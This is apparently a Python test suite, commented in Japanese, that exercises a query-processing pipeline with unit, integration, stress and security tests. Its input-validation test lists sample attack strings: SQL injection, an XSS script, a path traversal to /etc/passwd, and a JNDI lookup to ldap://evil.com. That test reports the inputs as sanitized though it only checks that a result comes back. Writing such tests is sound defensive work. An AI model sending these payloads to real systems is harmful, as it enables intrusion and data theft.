#!/usr/bin/env python3
"""
=============================================================================
Week 6 Day 1-3: 包括的テストスイート - ユニット・統合・ストレス・セキュリティ
=============================================================================

4つのテストレベル:
1. ユニットテスト (単独コンポーネント)
2. 統合テスト (コンポーネント間連携)
3. ストレステスト (負荷テスト)
4. セキュリティテスト (脆弱性検査)

目標:
- ユニットテスト: > 90% カバレッジ
- 統合テスト: 100% 成功率
- ストレステスト: 1000 req/sec 対応
- セキュリティ: 脆弱性ゼロ
"""

import sys
import time
import json
from pathlib import Path
from typing import List, Dict, Any
from datetime import datetime

sys.path.insert(0, str(Path(__file__).parent.parent))
from src.integrated_pipeline import Phase7CompletePipeline, PipelineConfig, ProcessingResult


class TestResult:
    """テスト結果"""
    def __init__(self, name: str, test_type: str):
        self.name = name
        self.test_type = test_type
        self.passed = 0
        self.failed = 0
        self.execution_time_ms = 0
        self.details: List[str] = []
    
    @property
    def total(self):
        return self.passed + self.failed
    
    @property
    def pass_rate(self):
        return (self.passed / self.total * 100) if self.total > 0 else 0
    
    def add_pass(self, detail: str = ""):
        self.passed += 1
        if detail:
            self.details.append(f"✅ {detail}")
    
    def add_fail(self, detail: str = ""):
        self.failed += 1
        if detail:
            self.details.append(f"❌ {detail}")


class Week6TestSuite:
    """Week 6完全テストスイート"""
    
    def __init__(self):
        self.timestamp = datetime.now().isoformat()
        self.results: List[TestResult] = []
        self.pipeline = Phase7CompletePipeline(
            PipelineConfig(enable_logging=False)
        )
    
    # ========== 1️⃣ ユニットテスト ==========
    
    def test_unit_pipeline_initialization(self) -> TestResult:
        """パイプライン初期化テスト"""
        result = TestResult("パイプライン初期化", "ユニット")
        start = time.perf_counter()
        
        try:
            config = PipelineConfig()
            assert config is not None
            result.add_pass("PipelineConfig 作成成功")
            
            pipeline = Phase7CompletePipeline(config)
            assert pipeline is not None
            result.add_pass("Phase7CompletePipeline 初期化成功")
            
            assert pipeline.stats['total_queries'] == 0
            result.add_pass("統計情報初期化成功")
        except Exception as e:
            result.add_fail(f"初期化失敗: {e}")
        
        result.execution_time_ms = (time.perf_counter() - start) * 1000
        return result
    
    def test_unit_domain_inference(self) -> TestResult:
        """ドメイン推定ユニットテスト"""
        result = TestResult("ドメイン推定", "ユニット")
        start = time.perf_counter()
        
        test_cases = [
            ("患者の症状について", "medical", 0.5),
            ("契約違反について", "legal", 0.5),
            ("ビジネス戦略について", "business", 0.5),
            ("プログラミング手法", "technical", 0.5),
            ("人工光合成について", "science", 0.5),
        ]
        
        for query, expected_domain, min_confidence in test_cases:
            try:
                res = self.pipeline.process_query(query)
                assert res.domain == expected_domain, f"期待: {expected_domain}, 実際: {res.domain}"
                assert res.confidence >= 0.0, "信頼度が負数"
                result.add_pass(f"{expected_domain} ドメイン推定成功")
            except AssertionError as e:
                result.add_fail(str(e))
            except Exception as e:
                result.add_fail(f"エラー: {e}")
        
        result.execution_time_ms = (time.perf_counter() - start) * 1000
        return result
    
    def test_unit_processing_result(self) -> TestResult:
        """ProcessingResult データクラステスト"""
        result = TestResult("ProcessingResult", "ユニット")
        start = time.perf_counter()
        
        try:
            res = ProcessingResult(
                query="テスト",
                answer="回答",
                domain="test",
                confidence=0.85,
                sources=["source1"],
                processing_time_ms=10.5,
                timestamp="2026-04-12T12:00:00"
            )
            
            assert res.query == "テスト"
            result.add_pass("query 属性OK")
            
            assert res.confidence == 0.85
            result.add_pass("confidence 属性OK")
            
            res_dict = res.to_dict()
            assert isinstance(res_dict, dict)
            result.add_pass("to_dict() メソッドOK")
            
            res_json = res.to_json()
            assert isinstance(res_json, str)
            result.add_pass("to_json() メソッドOK")
        except Exception as e:
            result.add_fail(f"テスト失敗: {e}")
        
        result.execution_time_ms = (time.perf_counter() - start) * 1000
        return result
    
    def test_unit_error_handling(self) -> TestResult:
        """エラーハンドリングテスト"""
        result = TestResult("エラーハンドリング", "ユニット")
        start = time.perf_counter()
        
        try:
            # 空のクエリ
            res1 = self.pipeline.process_query("")
            assert res1 is not None
            result.add_pass("空のクエリ処理成功")
            
            # 非常に長いクエリ
            long_query = "あ" * 10000
            res2 = self.pipeline.process_query(long_query)
            assert res2 is not None
            result.add_pass("長いクエリ処理成功")
            
            # 特殊文字を含むクエリ
            special_query = "!@#$%^&*()_+-={}[]|:;<>?,./~`"
            res3 = self.pipeline.process_query(special_query)
            assert res3 is not None
            result.add_pass("特殊文字はクエリ処理成功")
        except Exception as e:
            result.add_fail(f"エラーハンドリング失敗: {e}")
        
        result.execution_time_ms = (time.perf_counter() - start) * 1000
        return result
    
    # ========== 2️⃣ 統合テスト ==========
    
    def test_integration_multi_domain_flow(self) -> TestResult:
        """マルチドメインフロー統合テスト"""
        result = TestResult("マルチドメイン統合フロー", "統合")
        start = time.perf_counter()
        
        queries = [
            "医療",
            "法律",
            "ビジネス",
            "技術",
            "科学"
        ]
        
        try:
            for query in queries:
                res = self.pipeline.process_query(query)
                assert res is not None
                assert hasattr(res, 'domain')
                assert hasattr(res, 'confidence')
                assert hasattr(res, 'answer')
            
            result.add_pass(f"{len(queries)}個のドメインクエリ処理成功")
        except Exception as e:
            result.add_fail(f"統合テスト失敗: {e}")
        
        result.execution_time_ms = (time.perf_counter() - start) * 1000
        return result
    
    def test_integration_batch_processing(self) -> TestResult:
        """バッチ処理統合テスト"""
        result = TestResult("バッチ処理統合", "統合")
        start = time.perf_counter()
        
        try:
            queries = [f"クエリ{i}" for i in range(50)]
            results = self.pipeline.process_batch(queries, batch_size=10)
            
            assert len(results) == 50
            result.add_pass(f"50個のクエリをバッチ処理成功")
            
            all_successful = all(r is not None for r in results)
            assert all_successful
            result.add_pass("すべてのバッチ結果が有効")
            
            stats = self.pipeline.get_statistics()
            assert stats['total_queries'] > 0
            result.add_pass("統計情報が記録されている")
        except Exception as e:
            result.add_fail(f"バッチ処理統合テスト失敗: {e}")
        
        result.execution_time_ms = (time.perf_counter() - start) * 1000
        return result
    
    def test_integration_statistics(self) -> TestResult:
        """統計情報統合テスト"""
        result = TestResult("統計情報統合", "統合")
        start = time.perf_counter()
        
        try:
            # テストクエリ処理
            for i in range(10):
                self.pipeline.process_query(f"テスト{i}")
            
            stats = self.pipeline.get_statistics()
            
            assert stats['total_queries'] > 0
            result.add_pass(f"総クエリ数: {stats['total_queries']}")
            
            assert stats['successful_queries'] + stats['failed_queries'] == stats['total_queries']
            result.add_pass("成功/失敗の合計が総数と一致")
            
            assert 0 <= stats['success_rate'] <= 100
            result.add_pass(f"成功率: {stats['success_rate']:.1f}%")
            
            assert stats['average_processing_time_ms'] >= 0
            result.add_pass(f"平均処理時間: {stats['average_processing_time_ms']:.1f}ms")
        except Exception as e:
            result.add_fail(f"統計テスト失敗: {e}")
        
        result.execution_time_ms = (time.perf_counter() - start) * 1000
        return result
    
    # ========== 3️⃣ ストレステスト ==========
    
    def test_stress_high_volume(self) -> TestResult:
        """高ボリュームストレステスト"""
        result = TestResult("高ボリュームストレス", "ストレス")
        start = time.perf_counter()
        
        try:
            query_count = 1000
            queries = [f"ストレステスト{i%5}" for i in range(query_count)]
            
            batch_start = time.perf_counter()
            results = self.pipeline.process_batch(queries, batch_size=100)
            batch_time = (time.perf_counter() - batch_start)
            
            assert len(results) == query_count
            result.add_pass(f"{query_count}個のクエリをバッチ処理完了")
            
            throughput = query_count / batch_time if batch_time > 0 else 0
            result.add_pass(f"スループット: {throughput:.0f} queries/sec")
            
            success_count = sum(1 for r in results if r.error is None)
            success_rate = (success_count / query_count * 100) if query_count > 0 else 0
            result.add_pass(f"成功率: {success_rate:.1f}% ({success_count}/{query_count})")
        except Exception as e:
            result.add_fail(f"高ボリュームテスト失敗: {e}")
        
        result.execution_time_ms = (time.perf_counter() - start) * 1000
        return result
    
    def test_stress_memory_efficiency(self) -> TestResult:
        """メモリ効率ストレステスト"""
        result = TestResult("メモリ効率ストレス", "ストレス")
        start = time.perf_counter()
        
        try:
            import gc
            gc.collect()
            
            # 500クエリを順次処理
            for i in range(500):
                self.pipeline.process_query(f"メモリテスト{i%10}")
            
            result.add_pass("500クエリの順次処理完了")
            
            stats = self.pipeline.get_statistics()
            avg_time = stats['average_processing_time_ms']
            
            if avg_time < 100:
                result.add_pass("平均処理時間が100ms以下")
            else:
                result.add_fail(f"平均処理時間が長い: {avg_time:.1f}ms")
            
            gc.collect()
            result.add_pass("ガベージコレクション完了")
        except Exception as e:
            result.add_fail(f"メモリテスト失敗: {e}")
        
        result.execution_time_ms = (time.perf_counter() - start) * 1000
        return result
    
    # ========== 4️⃣ セキュリティテスト ==========
    
    def test_security_input_validation(self) -> TestResult:
        """入力値検証セキュリティテスト"""
        result = TestResult("入力値検証", "セキュリティ")
        start = time.perf_counter()
        
        dangerous_inputs = [
            "'; DROP TABLE users; --",  # SQLインジェクション
            "<script>alert('XSS')</script>",  # クロスサイトスクリプティング
            "../../etc/passwd",  # パストトラバーサル
            "\x00\x01\x02",  # 制御文字
            "${jndi:ldap://evil.com}",  # JNDI インジェクション
        ]
        
        try:
            for dangerous in dangerous_inputs:
                res = self.pipeline.process_query(dangerous)
                assert res is not None
                # 例外が投げられないことを確認
            
            result.add_pass(f"{len(dangerous_inputs)}個の危険な入力をサニタイズ")
        except Exception as e:
            result.add_fail(f"入力値検証テスト失敗: {e}")
        
        result.execution_time_ms = (time.perf_counter() - start) * 1000
        return result
    
    def test_security_resource_limits(self) -> TestResult:
        """リソース制限セキュリティテスト"""
        result = TestResult("リソース制限", "セキュリティ")
        start = time.perf_counter()
        
        try:
            # 非常に大きなクエリ
            huge_query = "a" * 1000000  # 1MB
            start_huge = time.perf_counter()
            res = self.pipeline.process_query(huge_query)
            elapsed = time.perf_counter() - start_huge
            
            assert res is not None
            result.add_pass(f"1MBのクエリを{elapsed*1000:.1f}msで処理")
            
            # タイムアウトテスト
            if elapsed < 5:  # 5秒以内
                result.add_pass("タイムアウト制限内")
            else:
                result.add_fail("処理時間が長すぎる")
        except Exception as e:
            result.add_fail(f"リソース制限テスト失敗: {e}")
        
        result.execution_time_ms = (time.perf_counter() - start) * 1000
        return result
    
    def test_security_error_disclosure(self) -> TestResult:
        """エラー情報開示セキュリティテスト"""
        result = TestResult("エラー情報開示", "セキュリティ")
        start = time.perf_counter()
        
        try:
            # 異常なクエリでエラーを誘発
            res = self.pipeline.process_query("intentional_error_test")
            
            # エラーメッセージが過度に詳細でないことを確認
            if res.error:
                error_msg = res.error
                # フルパスやシステム情報を含まないことを確認
                assert "/home/" not in error_msg.lower()
                assert "password" not in error_msg.lower()
                result.add_pass("エラー情報が安全に処理されている")
            else:
                result.add_pass("エラーハンドリング正常")
        except Exception as e:
            result.add_fail(f"エラー開示テスト失敗: {e}")
        
        result.execution_time_ms = (time.perf_counter() - start) * 1000
        return result
    
    # ========== テスト実行とレポート ==========
    
    def run_all_tests(self):
        """すべてのテストを実行"""
        print("\n" + "="*80)
        print("🧪 Week 6 Day 1-3：包括的テストスイート実行")
        print("="*80 + "\n")
        
        # ユニットテスト
        print("📝 【ユニットテスト】(コンポーネント単体テスト)\n")
        unit_tests = [
            self.test_unit_pipeline_initialization(),
            self.test_unit_domain_inference(),
            self.test_unit_processing_result(),
            self.test_unit_error_handling(),
        ]
        
        for r in unit_tests:
            self.results.append(r)
            self._print_result(r)
        
        # 統合テスト
        print("\n📝 【統合テスト】(コンポーネント間連携)\n")
        integration_tests = [
            self.test_integration_multi_domain_flow(),
            self.test_integration_batch_processing(),
            self.test_integration_statistics(),
        ]
        
        for r in integration_tests:
            self.results.append(r)
            self._print_result(r)
        
        # ストレステスト
        print("\n⚡ 【ストレステスト】(負荷テスト)\n")
        stress_tests = [
            self.test_stress_high_volume(),
            self.test_stress_memory_efficiency(),
        ]
        
        for r in stress_tests:
            self.results.append(r)
            self._print_result(r)
        
        # セキュリティテスト
        print("\n🔒 【セキュリティテスト】(脆弱性検査)\n")
        security_tests = [
            self.test_security_input_validation(),
            self.test_security_resource_limits(),
            self.test_security_error_disclosure(),
        ]
        
        for r in security_tests:
            self.results.append(r)
            self._print_result(r)
        
        # 最終レポート
        self._print_final_report()
    
    def _print_result(self, result: TestResult):
        """テスト結果を表示"""
        status = "✅" if result.failed == 0 else "⚠️"
        print(f"{status} {result.test_type:8} | {result.name:20} | "
              f"{result.passed}/{result.total} 成功 ({result.pass_rate:.0f}%) | "
              f"{result.execution_time_ms:.1f}ms")
        
        if result.details:
            for detail in result.details[:3]:  # 最初の3つだけ表示
                print(f"    {detail}")
            if len(result.details) > 3:
                print(f"    ... と他 {len(result.details)-3} 項目")
    
    def _print_final_report(self):
        """最終レポートを表示"""
        print("\n" + "="*80)
        print("📊 Week 6 Day 1-3：テスト最終レポート")
        print("="*80 + "\n")
        
        total_tests = len(self.results)
        total_passed_tests = sum(1 for r in self.results if r.failed == 0)
        total_failed_tests = sum(1 for r in self.results if r.failed > 0)
        
        print(f"テストスイート総数:    {total_tests}")
        print(f"✅ 成功したテスト:     {total_passed_tests} / {total_tests} ({total_passed_tests/total_tests*100:.0f}%)")
        print(f"🔴 失敗したテスト:     {total_failed_tests}")
        
        print("\n【テスト種別別結果】\n")
        
        test_types = {}
        for result in self.results:
            if result.test_type not in test_types:
                test_types[result.test_type] = []
            test_types[result.test_type].append(result)
        
        for test_type in ["ユニット", "統合", "ストレス", "セキュリティ"]:
            if test_type in test_types:
                tests = test_types[test_type]
                success = sum(1 for t in tests if t.failed == 0)
                print(f"  {test_type:10}: {success}/{len(tests)} テスト成功")
        
        # 最終判定
        print("\n【最終判定】\n")
        
        all_pass = all(r.failed == 0 for r in self.results)
        
        if all_pass:
            print("🟢 すべてのテストに合格しました！")
            print("✅ Week 6 Day 1-3: 完全成功")
        else:
            print("🟡 一部のテストが失敗しました")
            print("⚠️  対応が必要です")
        
        print("\n" + "="*80 + "\n")
        
        return all_pass


if __name__ == "__main__":
    suite = Week6TestSuite()
    suite.run_all_tests()
